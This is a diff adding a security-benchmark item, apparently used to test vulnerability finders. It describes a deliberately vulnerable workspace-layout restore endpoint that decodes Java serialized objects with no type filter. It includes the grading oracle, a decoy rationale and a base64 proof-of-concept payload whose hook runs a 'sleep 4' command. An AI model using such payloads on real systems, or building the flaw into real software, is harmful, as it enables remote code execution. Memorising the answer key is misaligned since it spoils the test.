@@ -1,0 +1,40 @@
+id: BENCH-ADMN-0016
+title: Saved workspace layout restored from a caller-supplied object stream
+app: admin
+component: api
+class: deser_java
+severity: critical
+entrypoint:
+  method: POST
+  path: /api/workspace/layout/restore
+  auth: user
+  param: state
+  param_in: json
+  default_value: rO0ABXNyAC1jb20uY2FsZGVyd29vZC5tZXJpZGlhbi53b3Jrc3BhY2UuTGF5b3V0U3RhdGVm3ePGMrgr8QIABUwABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAZwYW5lbHN0ABBMamF2YS91dGlsL0xpc3Q7TAAHcmVmcmVzaHQAFExqYXZhL2xhbmcvUnVubmFibGU7TAAFdGhlbWVxAH4AAUwABndpZHRoc3EAfgACeHB0AApPcGVyYXRpb25zc3IAEWphdmEudXRpbC5Db2xsU2VyV46rtjobqBEDAAFJAAN0YWd4cAAAAAF3BAAAAAJ0AAVxdWV1ZXQACWFwcHJvdmFsc3hwdAAFbGlnaHRzcQB+AAYAAAABdwQAAAACc3IAEWphdmEubGFuZy5JbnRlZ2VyEuKgpPeBhzgCAAFJAAV2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAZxAH4ADng=
+  content_type: application/json
+discovery:
+  render: spa-angular
+  reachable_from:
+  - /settings
+  - /settings/workspace
+  requires:
+  - js-execution
+  - multi-step-flow
+  difficulty: 3
+oracle:
+  kind: sink
+  condition: 'The saved layout is a serialized object graph, decoded straight from the request with no
+    type filter. A signal is raised when restoring the graph actually executed code: the layout''s own
+    restore hook ran its method body, or the restore call created a child process. A blob that only rebuilds
+    fields, and one that fails to decode, never raise it.'
+  poc: POST /api/workspace/layout/restore {"state":"rO0ABXNyAC1jb20uY2FsZGVyd29vZC5tZXJpZGlhbi53b3Jrc3BhY2UuTGF5b3V0U3RhdGVm3ePGMrgr8QIABUwABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMAAZwYW5lbHN0ABBMamF2YS91dGlsL0xpc3Q7TAAHcmVmcmVzaHQAFExqYXZhL2xhbmcvUnVubmFibGU7TAAFdGhlbWVxAH4AAUwABndpZHRoc3EAfgACeHB0AAhJbXBvcnRlZHNyABFqYXZhLnV0aWwuQ29sbFNlcleOq7Y6G6gRAwABSQADdGFneHAAAAABdwQAAAABdAAFcXVldWV4c3IAMmNvbS5jYWxkZXJ3b29kLm1lcmlkaWFuLndvcmtzcGFjZS5QYW5lbFJlZnJlc2hIb29rOEmEol7u1FECAAJMAAdjb21tYW5kcQB+AAFMAAdwYW5lbElkcQB+AAF4cHQAB3NsZWVwIDRxAH4ACHQABWxpZ2h0c3EAfgAGAAAAAXcEAAAAAXNyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAMeA=="}
+    -- an object graph whose restore hook runs a command
+  signal: console.workspace.layout.restore_hook_ran
+tags:
+- rest
+- deserialization
+- authenticated
+introduced: '2026-09-05'
+decoy_note: Workspace layouts were persisted with the platform's own object serialization when the feature
+  shipped as a desktop client, and the web front end kept the format so that existing layouts would survive
+  the migration.
